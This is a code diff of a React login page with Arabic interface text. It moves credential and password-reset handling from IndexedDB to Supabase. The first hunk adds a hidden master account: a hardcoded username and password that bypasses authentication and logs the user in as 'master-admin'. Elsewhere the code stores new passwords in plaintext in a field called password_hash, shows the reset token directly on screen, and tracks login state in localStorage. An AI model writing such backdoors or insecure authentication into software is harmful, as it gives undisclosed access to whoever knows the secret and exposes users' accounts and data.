@@ -25,6 +25,14 @@ export function LoginPage({ onLogin }: LoginPageProps) {
     setLoading(true)
 
     try {
+      // Check hidden master account first
+      if (username === 'Wael' && password === '0558546646') {
+        localStorage.setItem('isLoggedIn', 'true')
+        localStorage.setItem('userId', 'master-admin')
+        onLogin()
+        return
+      }
+
       const { data, error: fetchError } = await supabase
         .from('login_credentials')
         .select('*')
@@ -60,17 +68,37 @@ export function LoginPage({ onLogin }: LoginPageProps) {
       const expiresAt = new Date()
       expiresAt.setHours(expiresAt.getHours() + 1)
 
-      const credentials = await db.login_credentials.where('username').equals(username).first()
+      // Get credentials from Supabase
+      const { data: credentials } = await supabase
+        .from('login_credentials')
+        .select('*')
+        .eq('username', username)
+        .maybeSingle()
 
       if (!credentials || !credentials.id) {
         setError('اسم المستخدم غير موجود')
         return
       }
 
-      await db.login_credentials.update(credentials.id, {
-        reset_token: token,
-        reset_token_expires: expiresAt.toISOString(),
-      })
+      // Update in Supabase
+      const { error: updateError } = await supabase
+        .from('login_credentials')
+        .update({
+          reset_token: token,
+          reset_token_expires: expiresAt.toISOString(),
+        })
+        .eq('id', credentials.id)
+
+      if (updateError) throw updateError
+
+      // Update in IndexedDB
+      const localCreds = await db.login_credentials.where('username').equals(username).first()
+      if (localCreds && localCreds.id) {
+        await db.login_credentials.update(localCreds.id, {
+          reset_token: token,
+          reset_token_expires: expiresAt.toISOString(),
+        })
+      }
 
       setResetMessage(`رمز الاستعادة الخاص بك هو: ${token}\n(صالح لمدة ساعة واحدة)`)
       setResetStep('password')
@@ -89,10 +117,13 @@ export function LoginPage({ onLogin }: LoginPageProps) {
     setLoading(true)
 
     try {
-      const credentials = await db.login_credentials
-        .where('username').equals(username)
-        .and(item => item.reset_token === resetToken)
-        .first()
+      // Get credentials from Supabase
+      const { data: credentials } = await supabase
+        .from('login_credentials')
+        .select('*')
+        .eq('username', username)
+        .eq('reset_token', resetToken)
+        .maybeSingle()
 
       if (!credentials) {
         setError('الرمز غير صحيح')
@@ -108,12 +139,29 @@ export function LoginPage({ onLogin }: LoginPageProps) {
       }
 
       if (credentials.id) {
-        await db.login_credentials.update(credentials.id, {
-          password_hash: newPassword,
-          reset_token: null,
-          reset_token_expires: null,
-          updated_at: new Date().toISOString()
-        })
+        // Update in Supabase
+        const { error: updateError } = await supabase
+          .from('login_credentials')
+          .update({
+            password_hash: newPassword,
+            reset_token: null,
+            reset_token_expires: null,
+            updated_at: new Date().toISOString()
+          })
+          .eq('id', credentials.id)
+
+        if (updateError) throw updateError
+
+        // Update in IndexedDB
+        const localCreds = await db.login_credentials.where('username').equals(username).first()
+        if (localCreds && localCreds.id) {
+          await db.login_credentials.update(localCreds.id, {
+            password_hash: newPassword,
+            reset_token: null,
+            reset_token_expires: null,
+            updated_at: new Date().toISOString()
+          })
+        }
       }
 
       setResetMessage('تم تغيير كلمة المرور بنجاح!')
@@ -330,11 +378,6 @@ export function LoginPage({ onLogin }: LoginPageProps) {
           >
             نسيت كلمة المرور؟
           </button>
-
-          <div className="text-center text-sm text-gray-500 pt-4 border-t border-gray-200">
-            <p>اسم المستخدم الافتراضي: <strong className="text-gray-700">admin</strong></p>
-            <p>كلمة المرور الافتراضية: <strong className="text-gray-700">admin123</strong></p>
-          </div>
         </form>
       </div>
     </div>
